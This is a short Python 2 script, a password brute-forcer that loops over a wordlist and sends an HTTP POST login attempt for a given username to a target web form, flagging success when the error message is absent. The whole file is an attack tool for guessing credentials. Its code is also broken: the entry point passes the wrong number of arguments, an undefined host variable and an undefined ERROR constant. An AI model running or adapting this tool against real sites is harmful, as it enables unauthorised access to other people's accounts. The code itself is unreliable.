import sys, os, socket
import httplib, urllib

def brute_force(user,host,path,passwords_file):
    infile = open(passwords_file, 'r')
    # user = 'admin'
    # host = '10.12.31.6:80'
    # path = '/'
    print("Target : "+host+path)

    for line in infile:
        password=line.rstrip('\n')
        param = urllib.urlencode({'submit':'submit',\
        'username':user,\
        'passwd':password})

        header = {"Content-type": "application/x-www-form-urlencoded",\
        "Accept": "text/plain"}

        connect = httplib.HTTPConnection(host)
        connect.request("POST", path, param, header)
        response = connect.getresponse()
        print(response.status)
        print("--> "+user+":"+password)

        code = response.read()

        if code.find("Wrong user name or password") >= 0:
            print(chr(27)+"[0;91m"+"Incorrect")
        else:
            print(chr(27)+"[0;92m"+"Correct")
        print(chr(27)+"[0m")
        connect.close()
    infile.close()

if __name__== "__main__":
    try:
        target = sys.argv[1]
        target_path = sys.argv[2]
        username = sys.argv[3]
        passwords_file = sys.argv[4]

        if os.path.exists(passwords_file) == False:
            print(ERROR+" file does not exist.")
            sys.exit(4)

        brute_force(username,host,passwords_file)
    except (IndexError):
        print(ERROR+" incorrect arguments.")
        print("Usage: post_brute_force [target] [target_path] [username] [password_list]")
        sys.exit(4)

    except (KeyboardInterrupt):
        print("You pressed CTRL+C")
        sys.exit(3)
